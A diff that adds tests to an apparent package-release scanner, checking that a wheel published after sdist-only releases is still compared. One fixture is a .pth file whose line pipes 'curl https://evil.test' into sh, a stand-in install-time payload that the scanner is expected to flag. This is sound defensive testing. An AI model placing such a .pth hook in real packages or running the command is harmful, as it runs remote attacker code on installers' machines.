@@ -208,3 +208,16 @@ def test_signals_per_rule_are_limited(tmp_path: Path) -> None:
     new = {f"a/m{i}.py": f"Y = {i}\n" for i in range(50)}
 
     assert len(diff(tmp_path, BASE, {**BASE, **new})) == 10
+
+
+def test_wheel_after_sdists_only_is_still_compared(tmp_path: Path) -> None:
+    """Otherwise changing the format of a release would switch the whole diff off."""
+    wheel = {**BASE, "a-setup.pth": "import os; os.system('curl https://evil.test | sh')\n"}
+
+    found = rules(diff(tmp_path, BASE, {}, ({}, wheel)))
+
+    assert any(rule.startswith("diff.") for rule in found)
+
+
+def test_change_of_format_alone_says_nothing_about_known_code(tmp_path: Path) -> None:
+    assert rules(diff(tmp_path, BASE, {}, ({}, BASE))) == set()
